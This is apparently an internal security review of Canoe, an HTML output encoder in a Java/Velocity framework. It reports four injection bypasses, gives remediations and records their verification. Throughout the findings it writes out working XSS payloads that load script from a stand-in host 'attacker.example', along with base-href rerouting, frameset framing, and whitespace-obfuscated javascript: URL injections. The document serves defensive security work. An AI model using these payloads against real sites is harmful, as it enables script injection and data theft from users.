# Canoe Security Review — second pass

**Subject:** Canoe, the context-aware output encoder in Qlue
**Date:** 2026-07-27
**Revision reviewed:** `ae9bba5` (branch `canoe-hardening`, R28 landed)
**Scope:** adversarial retest of the remediation recorded in `CANOE-SECURITY-REVIEW-2026-07-25.md`
**Method:** independent harness and independent oracle — the corpus in `src/test` was read for
coverage but not used as evidence

---

## Summary

The twenty-four findings of the first review are **closed**. Each was re-tested from scratch against
the production render path, asserting on the jsoup-decoded sink rather than on Canoe's output, and
every one of them is inert. The corollary the first review rests on — that no encoder Canoe can
dispatch to emits `<`, `>`, `"` or `'` — also holds: **40,000 randomised renders produced zero
counterexamples**.

The remediation is nonetheless **not complete**, and the four findings below are live at `ae9bba5`.
None of them is an encoding defect. All four are *routing* defects, which is the same class as F1,
F3 and F7 — the encoder is correct and the wrong value is sent to it, or the right value is judged
against the wrong question.

Two of them are arbitrary script execution against a data-only attacker, on templates a careful
developer would consider safe, and both defeat **R9** — the origin filter that closed F6's
code-execution half.

### Findings at a glance

| # | Severity | Finding |
|---|---|---|
| F25 | Critical | `<script href>` and `<script xlink:href>` — SVG's own way of loading an external script — are not resource-loading sinks, so an off-origin script executes |
| F26 | Critical | The origin filter judges the reference **in isolation**, so template literal text in front of it completes the authority: `<script src="/$path">` loads from anywhere |
| F27 | Medium | `<frame src>` is not a resource-loading sink, so an attacker document enters the page's frame tree — the sink `<iframe src>` is protected from |
| F28 | Medium | The attribute-value prefix scan counts characters the URL parser strips, so an author-written `javascript:` URL that is not at value offset 0 is not detected |

### Threat model

Unchanged from the first review, and repeated because all four findings depend on it: the attacker
controls only *data* — request parameters, database values, anything reaching a `$reference` — and
never the Velocity template. `$_x.asis()` and `allowDirectOutput()` remain out of scope.

### What was confirmed closed

Re-tested independently, each asserting that the attacker's characters do **not** reach the decoded
sink:

| Finding | Probe | Result |
|---|---|---|
| F1 | `<form onsubmit="v('$data')">`, `<input onselect="v('$data')">` | suppressed |
| F2 | `<input onfocus="h('$data')">`, `<div onwebkitanimationend="h('$data')">` | suppressed |
| F19 | `<img src="y" onreadystatechange="f('$data')">` | suppressed |
| F3 | `<iframe srcdoc>`, `<svg><a xlink:href>`, `<form action>`, `<meta http-equiv=refresh content>` | suppressed |
| F4 | `<div style="color:$data">` | suppressed |
| F17 | `<a onclick="f({a:1,b:'$data'})">` | suppressed |
| F5 | `<input placeholder="Search">` before `<a href="javascript:f('$data')">` | suppressed; ordering no longer matters |
| F6 (code-execution half) | `<script src="$data/app.js">` | suppressed |
| F7 | `<object data="$data">` | suppressed |
| F20 | `<iframe sandbox="$data">`, `<script nonce="$data">` | suppressed |
| F24 | `<a href="$base$path">` with `path = @attacker.invalid/x` | `%40`, host unmoved |
| F9 | `write(char[], offset, len)` at offsets 0, 1, 3, 7 | parses the whole range; char-at-a-time render is byte-identical to one-call |
| F10, F11, F13, F14, F18, F21, F22 | `</scriptfoo>`, `<a href=$x>`, typed exception, `<!--a--->`, comment above DOCTYPE, `<br/>` | all as the remediation records |

And the general property, over an independent generator: 25 elements × 41 attribute names × 13
literal prefixes × 3 quoting styles × 29 payloads, 40,000 samples against a fixed seed. For each,
the count of `<`, `>`, `"` and `'` in the render was compared against a render with an inert
payload. **Zero differences.** The 22 documents whose parsed shape differed were all the recorded
`anEmptyUnquotedValueSwallowsTheNextAttribute` residual and none was a breakout.

That is the useful shape of this retest: the encoders and the state machine are sound, and
everything below is about *which encoder a value is sent to* and *what question is asked of it*.

### How this was measured

`ProductionRenderProbe` drives the real `VelocityViewFactory.render(page, view, writer)`. Browser
confirmation used Playwright Java 1.61.0 against two loopback origins — the page on
`http://127.0.0.1:<ephemeral>` and the attacker on `http://127.0.0.2:80`, port 80 so a
protocol-relative `//host` needs no colon — with a sentinel server recording every request and
`window.__pwned` recording execution. Every browser claim below fired in **all three** engines:

| Engine | Build |
|---|---|
| Chromium | 149.0.7827.0 |
| Firefox | 151.0 |
| WebKit | 26.5 |

---

## F25 — Critical: SVG `<script href>` and `<script xlink:href>` are not resource-loading sinks

**Location:** `Canoe.java:396-407` (`RESOURCE_LOADING_SINKS`) and `Canoe.java:1106-1108`
(`isResourceLoadingSink`).

R9 gave Canoe the element name and used it to route the six element/attribute combinations that
dereference a URL into an executable context through `HtmlEncoder.urlResource()`, which rejects an
off-origin authority. The routing table is a `Map<String, String>`:

```java
sinks.put("script", "src");
sinks.put("iframe", "src");
...
```

**One attribute per element.** SVG's `<script>` element does not use `src`. SVG 1.1 loads an
external script with `xlink:href` and SVG 2 with `href`, and every shipping engine supports both.
Both names are in `URL_ATTRIBUTE_NAMES`, so both classify as `ATTR_URI` and take the ordinary
`url()` — a scheme filter, not an origin filter — exactly as `<a href>` does.

**Exploitation vector.** A bare reference; no template trick and no second reference:

```html
<svg><script href="$scriptUrl"></script></svg>
```

`scriptUrl` = `//attacker.example/x.js` renders byte for byte:

```html
<svg><script href="//attacker.example/x.js"></script></svg>
```

**Measured in a browser.** The sentinel at the attacker origin was fetched and the script *executed*
— `window.__pwned == 1` — in Chromium, Firefox and WebKit, for both `href` and `xlink:href`. The
control in the same run, `<script src="$scriptUrl">`, was suppressed to `src=""` and the attacker
origin was never contacted. So this is not a claim about specifications: the same page, the same
payload and the same encoder produce arbitrary script execution with the page's full privileges
through one attribute name and suppression through another.

**Why the first review did not see it.** F3 recorded `xlink:href` as an SVG *link* — "`javascript:`
executes in all SVG-capable browsers" — and R6 answered it by routing the name to `url()`, which
does neutralise `javascript:`. R26 then ledgered `url.xlink-href`'s three off-origin rows as
`ACCEPTED_RESIDUAL` with sink class `OPEN_REDIRECT`, on the argument that an off-origin link is an
ordinary thing for a page to contain. That argument is right for `<svg><a xlink:href>`, which is the
only element the corpus pairs the name with, and it is wrong for `<svg><script xlink:href>`. The
mistake is the same one R9 exists to correct — *the same URL attribute name is a link on one element
and code execution on another* — repeated on an element the table does not model.

---

## F26 — Critical: the origin filter judges the reference in isolation, so template text completes the authority

**Location:** `HtmlEncoder.java:460-483` (`urlResource`) and `HtmlEncoder.java:505-529`
(`authorityOf`).

`urlResource()` rejects a value whose **own** encoded output introduces an authority. It is handed
the reference's value and nothing else. It cannot see the literal text the template wrote in front
of the reference in the same attribute value — and that literal text is under the template author's
control, not the attacker's, so nothing about it looks dangerous while it is being written.

The comment on the method states the policy honestly and the gap is in the policy, not in the code:

> "off-origin" cannot mean "different from ours". It means "specifies an authority at all"

A value that specifies no authority at all can still *complete* one that the template opened, or
*extend* one the template began.

**Measured.** Rendered output, on the production path:

| Template | Payload | Rendered |
|---|---|---|
| `<script src="$u">` | `//attacker.example/x.js` | `src=""` — R9 works |
| `<script src="/$u">` | `/attacker.example/x.js` | `src="//attacker.example/x.js"` |
| `<script src="//$u">` | `attacker.example/x.js` | `src="//attacker.example/x.js"` |
| `<script src="https://$u">` | `attacker.example/x.js` | `src="https://attacker.example/x.js"` |
| `<script src="https://cdn.example.com$u">` | `.attacker.example/x.js` | `src="https://cdn.example.com.attacker.example/x.js"` |
| `<script src="//cdn.example.com$u">` | `.attacker.example/x.js` | `src="//cdn.example.com.attacker.example/x.js"` |

And the shapes that are **not** affected, because the authority is already closed when the reference
arrives: `<script src="$u">` (offset 0, which is the only position R9 was measured in),
`<script src="/static/$u">`, `<script src="https://cdn.example.com/$u">`, `<script src="/p/$u">`.
The rule is positional and has nothing to do with the attribute or the payload: **the reference is
dangerous exactly when the URL's authority is still open at the point it is inserted.**

**It needs no off-origin literal in the template at all.** Two ordinary references are enough:

```html
<script src="$base$path">      base = "/"      path = "/attacker.example/x.js"
```

**Measured in a browser**, all three engines:

| Template | Payload | Observed |
|---|---|---|
| `<script src="/$p">` | `/attacker.example/x.js` | fetched **and executed** |
| `<base href="/$p">` | `/attacker.example/` | the page's own `<script src="y.js">` was then fetched from and executed by the attacker origin |
| `<link rel=stylesheet href="/$p">` | `/attacker.example/x.css` | attacker stylesheet fetched |
| `<iframe src="/$p">` | `/attacker.example/x` | attacker document framed |
| `<object data="/$p">`, `<embed src="/$p">` | `/attacker.example/x` | attacker origin fetched |

The `<base href>` row is the widest: one attacker-chosen path segment reroutes **every** relative URL
on the rest of the page.

**This also refutes a claim the remediation documents make.** `PLAN.md` §T16, and the review note on
F6, state:

> full-URL and path-prefix let the payload reach the URL's **authority** and are the vector;
> path-suffix, query-parameter and fragment do not and are safe

The path-suffix position was measured as `href="/p/$data"`, where the authority is closed. It is
*not* closed in `href="/$data"`, which is the same position with one less character of literal, and
`<a href="/$slug">` — as ordinary a template as exists — turns a payload of `/attacker.example` into
`//attacker.example`. On `<a href>` that is an open redirect, which is the accepted residual class;
on the six resource sinks it is the outcome R9 was written to prevent.

The consequence for triage is worse than the consequence for the claim. The review's guidance is to
grep for `="$` and `='$`. **Every shape in the table above is missed by that grep**, because the
reference does not follow the quote.

**Why the corpus did not catch it.** No corpus template puts literal URL text in front of a
reference in a resource-loading sink. The two URL positions with a literal prefix that exist —
`<a href="https://app.example/$data">` and `<a href="/search?q=$data">` — both close the authority
before the reference, and both are on `<a>`.

---

## F27 — Medium: `<frame src>` is not a resource-loading sink

**Location:** `Canoe.java:396-407`, the same table as F25.

`RESOURCE_LOADING_SINKS` holds `iframe`. It does not hold `frame`. `<frameset><frame src="$u">` is
the same sink as `<iframe src>` — a document of the attacker's choosing, loaded into the page's own
frame tree — and it takes `url()`, so an off-origin authority passes.

**Measured in a browser**, all three engines: `<frameset><frame src="//attacker.example/p"></frameset>`
loaded the attacker document. Framesets are obsolete in the standard and are not obsolete in any
shipping engine, which is the distinction R26's own `INERT_SINK` note draws and the reason this is a
finding rather than a curiosity.

Rated Medium rather than Critical on one precondition discount: the framed document does not run in
the page's origin, so the outcome is a hostile document inside the page's frame tree — UI redress,
phishing under the page's chrome — rather than same-origin script. That is the same outcome
`<iframe src>` has, and `<iframe src>` is protected, so the rating is about the outcome and the
routing gap is exactly as real.

---

## F28 — Medium: the value prefix scan counts characters the URL parser strips

**Location:** `Canoe.java:1609-1635` (the `TAG_ATTR_VALUE` prefix scan) and `Canoe.java:963-978`
(`detectAttributePrefix`).

`detectAttributePrefix()` is what stops `<a href="javascript:f('$id')">` from being injectable: the
buffered value prefix is compared against `javascript`, `livescript`, `mocha`, `data` and
`asfunction`, and a match narrows the context to a suppressing one. The scan gives up once ten
characters are buffered, because ten is the longest prefix.

The scan buffers **every** value character. The URL parser does not read every value character: it
removes leading C0 controls and spaces, and removes all ASCII tab, LF and CR from anywhere in the
URL. So Canoe and the browser disagree about where the scheme starts, and one ignorable character is
enough to push `javascript` past the ten-character window:

```html
<a href=" javascript:f('$id')">      leading space
<a href="java<TAB>script:f('$id')">  tab inside the scheme
```

In both, `detectAttributePrefix()` never fires, the value keeps `ATTR_URI`, and `$id` is encoded
with `url()`.

**`url()` is not sufficient there, and the reason is a third decoder.** The HTML Standard obtains a
`javascript:` URL's script source by **percent-decoding** the URL. So `url()`'s `%27` becomes an
apostrophe again, after the HTML parser has finished and before the script is compiled:

```
id = ');window.__pwned=1;//
rendered  href=" javascript:f('%27);window.__pwned=1;//')"
compiled  f('');window.__pwned=1;//')
```

**Measured in a browser**, all three engines: a dispatched click executed the payload in Chromium,
Firefox and WebKit, for both the leading-space and the tab spelling. The control — the same template
with no leading space — was suppressed to `f('')` and did not execute.

**Precondition, stated plainly.** The template must contain an author-written `javascript:` URL that
is not at value offset 0. That is narrower than F25 and F26, which is why this is Medium: the plain
spelling is by far the commonest and it is correctly suppressed. It is a finding rather than a
curiosity because the failure is silent, the difference between the safe and the unsafe spelling is
one character of whitespace, and no reviewer reading either template would see it.

---

## Remediation, in priority order

1. **Make the resource-sink table element → *set* of attribute names** (F25, F27), and put
   `script → {src, href, xlink:href}` and `frame → {src}` in it. The current `Map<String,String>`
   cannot express an element with two URL sinks, which is the structural cause of F25.

2. **Give the URL context a position** (F26). Canoe already scans the head of every attribute value;
   it needs to track where in a URL that scan is — nothing yet, one slash, inside a scheme, after a
   scheme, inside the authority, past it — and a resource-sink reference must be refused wherever
   the value it emits could complete or extend the authority. Judging the reference in isolation
   cannot be made correct, because the fact that decides it is not in the reference.

3. **Normalise the prefix buffer the way a URL parser does** (F28): skip ASCII tab, LF and CR
   anywhere, and leading spaces and C0 controls, so that Canoe's view of where the scheme begins is
   the browser's view.

---

## Resolved — R29, R30, R31 (2026-07-27)

All four are closed on this branch. The re-verification at the end of this section is the same
harness that found them, re-run.

### R29 closes F25 and F27 — the resource-sink table is element → set

`RESOURCE_LOADING_SINKS` is now `Map<String, Set<String>>`, so an element may have more than one URL
attribute that dereferences into an executable or page-controlling context:

| Element | Attributes | Why |
|---|---|---|
| `script` | `src`, `href`, `xlink:href` | HTML uses `src`; SVG 2 uses `href` and SVG 1.1 `xlink:href`, and every shipping engine runs both (F25) |
| `iframe`, `embed` | `src` | as before |
| `frame` | `src` | the `<iframe src>` sink under its obsolete-but-shipping spelling (F27) |
| `object` | `data` | as before |
| `link`, `base` | `href` | as before |

`isResourceLoadingSink()` is a set membership test rather than a string equality, and a null
`tagName` still answers "not a resource sink" without a guard.

**What deliberately did not go in**, so that the boundary is a decision rather than an oversight:
`<svg><use href>` and `<svg><image href>` load a document fragment and an image, and every current
engine refuses a cross-origin `<use>`; `<video src>`, `<audio src>`, `<source src>`, `<track src>`
and `<input type=image src>` fetch media under the same argument that keeps `<img src>` on `url()`.
All of them stay in F6's accepted-residual class, which is where `<img src>` already is.

### R30 closes F26 — the URL context has a position

Canoe now runs a five-state machine over the characters of every attribute value, alongside the
prefix scan and in the same guard, so it costs one switch per value character:

```
URLV_START  ->  URLV_SCHEME  ->  URLV_AFTER_SCHEME  ->  URLV_AUTHORITY  ->  URLV_PATH
       \-> URLV_SLASH -> URLV_AUTHORITY (on a second '/')
```

It is reset where the value begins — on the `=` in `TAG_ATTR_NAME_AFTER`, not on the first value
character, so `<a href=$x>` (F11's shape) is judged too. It ignores exactly the characters a URL
parser removes, which is also what R31 needed, so the two fixes share one predicate.

`Canoe.encode(String)` — the instance form, which is what `CanoeReferenceInsertionHandler` calls —
then judges a `CTX_URI_RESOURCE` reference by where it sits:

| Position at the reference | Answer |
|---|---|
| `URLV_START`, `URLV_SCHEME`, `URLV_PATH` | `urlResource()`, unchanged. Either the value carries the whole authority, or there can be no authority after this point |
| `URLV_SLASH` — the value so far is a single `/` | `urlResource()`, **and** refuse an output that begins with `/`, because the pair would be `//host` |
| `URLV_AFTER_SCHEME`, `URLV_AUTHORITY` | refuse. The reference lands where the browser is still reading the host, and no encoding of a hostname means anything other than that hostname — the same argument F20 makes about policy tokens |

Every refusal is the empty string, which is what Canoe already writes for a suppressed reference,
and each is logged at debug level with the attribute name and position, next to R5's
unrecognised-attribute diagnostic — because a value that vanishes with no diagnostic is what sends a
developer to `$_x.asis()`.

**Two things R30 deliberately does not do.**

It does not gate `CTX_URI`. `<a href="/$slug">` with `slug = /attacker.example` is still an open
redirect, and `<img src="//cdn$p">` is still a referrer leak — because those are the *same* outcome
that `<a href="$u">` already has at offset 0, which R9 scoped out and R26 ledgered as 68
`ACCEPTED_RESIDUAL` rows. Gating the concatenated spelling while the direct spelling is accepted
would be an inconsistency, not a fix. What has changed is that the residue is now known to include
these positions: the claim in `PLAN.md` §T16 that path-suffix is safe is **false as stated**, and it
is corrected there and in the first review's F6 note rather than left standing.

It does not try to reconstruct the whole URL. The state machine answers one question — is the
authority still open — and answers it conservatively: an unrecognised shape resolves to
"authority open", which refuses.

### R31 closes F28 — the prefix buffer sees what the URL parser sees

The `TAG_ATTR_VALUE` scan no longer buffers a character the URL parser would remove: ASCII tab, LF
and CR anywhere, and space and C0 controls while nothing has been buffered yet. `<a href=" javascript:…">`
and `<a href="java<TAB>script:…">` therefore buffer `javascript`, the colon fires
`detectAttributePrefix()`, and the context narrows to `ATTR_JS` — suppressed, exactly as the
unspaced spelling always was.

The change can only ever *narrow*, for the same reason `detectAttributePrefix()` can: the five
prefixes it can match all map to suppressing contexts. A plain-text attribute whose value happens to
begin with ignorable whitespace and a recognised scheme is suppressed rather than encoded, which is
the fail-closed direction and is already the behaviour without the whitespace.

### The ledger

Eight cases were added to the corpus, which is where the four findings were invisible. The blind
spots were structural rather than accidental, and each is now a row:

| Case | Finding |
|---|---|
| `url.svg-script-href`, `url.svg-script-xlink-href` | F25 — an attribute name's ledger row is a row about that name **on that element**; `xlink:href` was in the corpus, paired only with `<svg><a>` |
| `url.frame-src` | F27 |
| `url.script-src-authority-suffix`, `url.script-src-leading-slash` | F26 — the two positions the corpus had no template for |
| `prefix.javascript-leading-space`, `prefix.javascript-tab-inside-scheme` | F28 |

`MatrixReportTest` now reads the glance tables of **both** reviews, so the coverage denominator is
the whole finding list and a citation to F25–F28 resolves. Scoreboard after R31 — `SAFE` 520,
`ACCEPTED_RESIDUAL` 68, `SUPPRESSED_BY_DESIGN` 472, `SUPPRESSED_UNINTENDED` 12, `REJECTED` 36,
**`KNOWN_VULNERABLE` 0** — 1,108 invocations across 288 cases.

One row is worth naming because it is a cost rather than a fix. On `url.script-src-leading-slash`
the payload `/\attacker.invalid/x.js` is now suppressed, and `url()` had already neutralised it: the
backslash becomes `%5C`, so the value was a same-origin path. R30's slash guard tests the encoded
output rather than re-parsing it, and a value beginning `/` is refused whatever follows. That is
deliberate — the guard is meant to be cheap and blunt — and it is recorded rather than special-cased.

### Verification at the close

- `./gradlew test` — **6,566 tests, 0 failures.**
- `./gradlew canoeCoverageGate` — **passing**, with every floor one branch outcome below its
  measurement. The floors were re-measured against the new code rather than carried forward, per
  rule 3 of that comment: 76 outcomes were added to `Canoe`, all of them reached, and the
  dead-branch inventory comes out **unchanged** at the same 16. Three methods join the gate —
  `isResourceLoadingSink()`, `advanceUrlValueState()` and `encodeResourceUrl()` — by the same
  argument that put `setTagAttributeContext()` there: an unreached outcome in any of them is a
  refusal nobody tested.
- `./gradlew browserTest` — **288 tests, 0 failures, 2 skipped, on Chromium 149.0.7827.0, Firefox
  151.0 and WebKit 26.5.** The two skips are R28's recorded Firefox driver limitation and are
  unrelated.
- The harness that found F25–F28, re-run: every browser row above is now silent and the control
  rows still fire. `<svg><script href>` and `<svg><script xlink:href>` render empty in all three
  engines; `<script src="/$p">`, `<base href="/$p">`, `<link href="/$p">`, `<iframe src="/$p">`,
  `<object data="/$p">` and `<embed src="/$p">` render empty; `<frameset><frame src="$p">` renders
  empty; the two `javascript:` spellings render `f('')` and do not execute.
- The 40,000-sample randomised breakout sweep was re-run against the fixed code: still zero
  counterexamples. The seventeen per-finding probes for F1–F24 still read `closed`.

### What this pass did not do

Two things are worth writing down so they are decisions and not omissions.

**The open-redirect and referrer residue grew, and it is still accepted.** `<a href="/$slug">` and
`<img src="//cdn$p">` remain reachable, because the outcome is the one R9 scoped out and R26
ledgered 68 rows of. What changed is that these positions are now known to be in it.

**`urlResource()` still cannot see the whole attribute value.** R30 answers the position question in
Canoe, where the information is, and hands the encoder the same value it always got. A design that
gave the encoder the literal text as well would be stronger and is a larger change than a security
fix should be; the seam is recorded here rather than moved.
